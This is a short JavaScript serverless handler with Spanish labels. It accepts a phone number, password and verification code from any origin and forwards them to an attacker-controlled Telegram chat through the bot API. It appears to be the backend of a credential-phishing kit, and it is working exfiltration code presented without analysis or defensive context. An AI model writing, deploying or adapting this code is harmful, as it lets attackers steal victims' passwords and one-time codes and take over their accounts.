export const onRequest = async ({ request, env }) => {
  try {
    const { phone, password, code } = await request.json();

    const message = `---Info--\n📲 Teléfono: ${phone}\n🔐 Clave: ${password}\n📤 Código: ${code || "..."}`;

    const res = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: env.TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!res.ok) {
      return new Response("Error enviando a Telegram", { status: 500 });
    }

    return new Response("Mensaje enviado con éxito", {
      status: 200,
      headers: { "Access-Control-Allow-Origin": "*" },
    });
  } catch (err) {
    console.error("Error interno:", err);
    return new Response("Error interno", { status: 500 });
  }
};
